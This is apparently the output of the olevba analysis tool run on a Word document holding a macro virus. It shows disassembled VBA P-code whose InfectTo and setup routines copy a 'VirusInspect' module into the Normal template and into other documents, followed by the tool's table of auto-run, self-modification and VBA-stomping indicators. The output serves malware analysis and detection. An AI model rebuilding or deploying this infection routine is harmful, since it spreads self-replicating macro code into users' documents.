' 	QuoteRem 0x0000 0x002F "    Set doc = Documents.Add(Template:=TempName)"
' Line #282:
' 	QuoteRem 0x0003 0x001D " doc.SaveAs FileName:=NewName"
' Line #283:
' 	ExitSub 
' Line #284:
' 	Label NewDocErr 
' Line #285:
' 	Label ErrSave 
' Line #286:
' Line #287:
' 	LitStr 0x0006 "Ê§°Ü£¡"
' 	ArgsCall MsgBox 0x0001 
' Line #288:
' Line #289:
' 	EndSub 
' Line #290:
' Line #291:
' Line #292:
' 	FuncDefn (Function GetVer(prj As Variant) As Double)
' Line #293:
' 	QuoteRem 0x0000 0x001E "Dim pprj As Variant 'VBProject"
' Line #294:
' 	Dim 
' 	VarDefn VBCom (As Variant)
' 	QuoteRem 0x0015 0x000B "VBComponent"
' Line #295:
' 	Dim 
' 	VarDefn VerStr (As String)
' Line #296:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #297:
' 	Dim (Const) 
' 	LitStr 0x0007 "Version"
' 	VarDefn Tag (As String)
' Line #298:
' 	LitR8 0x0000 0x0000 0x0000 0x0000 
' 	St GetVer 
' Line #299:
' 	SetStmt 
' 	LitNothing 
' 	Set g_VBCom 
' Line #300:
' 	StartForVariable 
' 	Ld VBCom 
' 	EndForVariable 
' 	Ld prj 
' 	MemLd VBComponents 
' 	ForEach 
' Line #301:
' 	Ld Logo 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #302:
' 	SetStmt 
' 	Ld VBCom 
' 	Set g_VBCom 
' Line #303:
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	St GetVer 
' Line #304:
' 	OnError NoVer 
' Line #305:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VerStr 
' Line #306:
' 	LitDI2 0x0001 
' 	Ld VerStr 
' 	Ld Tag 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St i 
' Line #307:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #308:
' 	Ld VerStr 
' 	Ld VerStr 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	Ld Tag 
' 	FnLen 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	St GetVer 
' Line #309:
' 	EndIfBlock 
' Line #310:
' 	Label NoVer 
' Line #311:
' 	ExitFunc 
' Line #312:
' 	EndIfBlock 
' Line #313:
' 	StartForVariable 
' 	Ld VBCom 
' 	EndForVariable 
' 	NextVar 
' Line #314:
' 	EndFunc 
' Line #315:
' 	FuncDefn (Function GetLatest() As Variant)
' Line #316:
' 	Dim 
' 	VarDefn prj (As Variant)
' 	QuoteRem 0x0013 0x0009 "VBProject"
' Line #317:
' 	Dim 
' 	VarDefn Ver (As Double)
' Line #318:
' 	SetStmt 
' 	LitNothing 
' 	Set GetLatest 
' Line #319:
' 	LitDI2 0x0000 
' 	St LatestVer 
' Line #320:
' 	StartForVariable 
' 	Ld prj 
' 	EndForVariable 
' 	Ld ThisDocument 
' 	MemLd Application 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	ForEach 
' Line #321:
' 	Ld prj 
' 	ArgsLd GetVer 0x0001 
' 	St Ver 
' Line #322:
' 	Ld Ver 
' 	Ld LatestVer 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #323:
' 	Ld Ver 
' 	St LatestVer 
' Line #324:
' 	SetStmt 
' 	Ld g_VBCom 
' 	Set GetLatest 
' Line #325:
' 	EndIfBlock 
' Line #326:
' 	StartForVariable 
' 	Ld prj 
' 	EndForVariable 
' 	NextVar 
' Line #327:
' 	EndFunc 
' Line #328:
' 	FuncDefn (Sub setup())
' Line #329:
' 	Ld ThisDocument 
' 	MemLd Application 
' 	MemLd NormalTemplate 
' 	ArgsCall (Call) InfectTo 0x0001 
' Line #330:
' 	LitStr 0x000A "Installed "
' 	Ld Logo 
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #331:
' Line #332:
' 	EndSub 
' Line #333:
' Line #334:
' 	FuncDefn (Function FoundMod(doc As Variant, ByVal s As String) As Variant)
' Line #335:
' 	Dim 
' 	VarDefn VBCom (As Variant)
' 	QuoteRem 0x0016 0x000B "VBComponent"
' Line #336:
' 	StartForVariable 
' 	Ld VBCom 
' 	EndForVariable 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #337:
' 	Ld VBCom 
' 	MemLd New 
' 	Ld s 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #338:
' 	SetStmt 
' 	Ld VBCom 
' 	Set FoundMod 
' Line #339:
' 	ExitFunc 
' Line #340:
' 	EndIfBlock 
' Line #341:
' 	StartForVariable 
' 	Next 
' Line #342:
' 	SetStmt 
' 	LitNothing 
' 	Set FoundMod 
' Line #343:
' 	EndFunc 
' Line #344:
' Line #345:
' 	FuncDefn (Sub InfectTo(doc As Variant))
' Line #346:
' 	Dim 
' 	VarDefn prj (As Variant)
' 	QuoteRem 0x0013 0x0009 "VBProject"
' Line #347:
' 	Dim 
' 	VarDefn VBCom
' 	VarDefn ObjCom (As Variant)
' 	QuoteRem 0x001D 0x000B "VBComponent"
' Line #348:
' 	Dim 
' 	VarDefn r (As Double)
' Line #349:
' 	Dim 
' 	VarDefn saved (As Boolean)
' Line #350:
' Line #351:
' Line #352:
' 	Dim (Const) 
' 	LitStr 0x000C "VirusInspect"
' 	VarDefn modname (As String)
' Line #353:
' Line #354:
' 	Ld doc 
' 	MemLd saved 
' 	St saved 
' Line #355:
' 	SetStmt 
' 	Ld GetLatest 
' 	Set VBCom 
' Line #356:
' 	Ld doc 
' 	MemLd VBProject 
' 	ArgsLd GetVer 0x0001 
' 	St r 
' Line #357:
' 	Ld r 
' 	Paren 
' 	SelectCase 
' Line #358:
' 	Ld LatestVer 
' 	CaseGe 
' 	CaseDone 
' 	BoS 0x0000 
' 	ExitSub 
' Line #359:
' 	CaseElse 
' Line #360:
' 	Ld r 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #361:
' 	LitStr 0x000A "Upgraded£¡"
' 	Ld Logo 
' 	Concat 
' 	ArgsCall (Call) ShowStatus 0x0001 
' Line #362:
' 	ElseBlock 
' Line #363:
' 	LitStr 0x000B "Installed£¡"
' 	Ld Logo 
' 	Concat 
' 	ArgsCall (Call) ShowStatus 0x0001 
' Line #364:
' 	EndIfBlock 
' Line #365:
' 	ArgsCall Beep 0x0000 
' Line #366:
' 	ArgsCall Beep 0x0000 
' Line #367:
' 	ArgsCall Beep 0x0000 
' Line #368:
' Line #369:
' 	EndSelect 
' Line #370:
' Line #371:
' 	SetStmt 
' 	Ld doc 
' 	Ld modname 
' 	ArgsLd FoundMod 0x0002 
' 	Set ObjCom 
' Line #372:
' 	Ld ObjCom 
' 	LitNothing 
' 	Is 
' 	Paren 
' 	IfBlock 
' Line #373:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set ObjCom 
' 	QuoteRem 0x0037 0x0015 "vbext_ct_StdModule  )"
' Line #374:
' 	Ld modname 
' 	Ld ObjCom 
' 	MemSt New 
' Line #375:
' 	EndIfBlock 
' Line #376:
' 	LitDI2 0x0001 
' 	Ld ObjCom 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ObjCom 
' 	MemLd CodeModule 
' 	ArgsMemCall (Call) DeleteLines 0x0002 
' Line #377:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld VBCom 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ObjCom 
' 	MemLd CodeModule 
' 	ArgsMemCall (Call) InsertLines 0x0002 
' Line #378:
' 	Ld saved 
' 	Paren 
' 	IfBlock 
' Line #379:
' 	OnError (Resume Next) 
' Line #380:
' 	Ld doc 
' 	MemLd FullName 
' 	Ld doc 
' 	ArgsMemCall (Call) SaveAs 0x0001 
' Line #381:
' 	EndIfBlock 
' Line #382:
' Line #383:
' 	EndSub 
' Line #384:
' Line #385:
' Line #386:
' Line #387:
' Line #388:
' Line #389:
' Line #390:
' Line #391:
' Line #392:
' Line #393:
' Line #394:
' Line #395:
' Line #396:
' Line #397:
' Line #398:
' Line #399:
' Line #400:
' Line #401:
' Line #402:
' Line #403:
' Line #404:
' Line #405:
' Line #406:
' Line #407:
' Line #408:
' Line #409:
' Line #410:
' Line #411:
' Line #412:
' Line #413:
' Line #414:
' Line #415:
' Line #416:
' Line #417:
' Line #418:
' Line #419:
' Line #420:
' Line #421:
' Line #422:
' Line #423:
' Line #424:
' Line #425:
' Line #426:
' Line #427:
' Line #428:
' Line #429:
' Line #430:
' Line #431:
' Line #432:
' Line #433:
' Line #434:
' Line #435:
' Line #436:
' Line #437:
' Line #438:
' Line #439:
' Line #440:
' Line #441:
' Line #442:
' Line #443:
' Line #444:
' Line #445:
' Line #446:
' Line #447:
' Line #448:
' Line #449:
' Line #450:
' Line #451:
' Line #452:
' Line #453:
' Line #454:
' Line #455:
' Line #456:
' Line #457:
' Line #458:
' Line #459:
' Line #460:
' Line #461:
' Line #462:
' Line #463:
' Line #464:
' Line #465:
' Line #466:
' Line #467:
' Line #468:
' Line #469:
' Line #470:
' Line #471:
' Line #472:
' Line #473:
' Line #474:
' Line #475:
' Line #476:
' Line #477:
' Line #478:
' Line #479:
' Line #480:
' Line #481:
' Line #482:
' Line #483:
' Line #484:
' Line #485:
' Line #486:
' Line #487:
' Line #488:
' Line #489:
' Line #490:
' Line #491:
' Line #492:
' Line #493:
' Line #494:
' Line #495:
' Line #496:
' Line #497:
' Line #498:
' Line #499:
' Line #500:
' Line #501:
' Line #502:
' Line #503:
' Line #504:
' Line #505:
' Line #506:
' Line #507:
' Line #508:
' Line #509:
' Line #510:
' Line #511:
' Line #512:
' Line #513:
' Line #514:
' Line #515:
' Line #516:
' Line #517:
' Line #518:
' Line #519:
' Line #520:
' Line #521:
' Line #522:
' Line #523:
' Line #524:
' Line #525:
' Line #526:
' Line #527:
' Line #528:
' Line #529:
' Line #530:
' Line #531:
' Line #532:
' Line #533:
' Line #534:
' Line #535:
' Line #536:
' Line #537:
' Line #538:
' Line #539:
' Line #540:
' Line #541:
' Line #542:
' Line #543:
' Line #544:
' Line #545:
' Line #546:
' Line #547:
' Line #548:
' Line #549:
' Line #550:
' Line #551:
' Line #552:
' Line #553:
' Line #554:
' Line #555:
' Line #556:
' Line #557:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

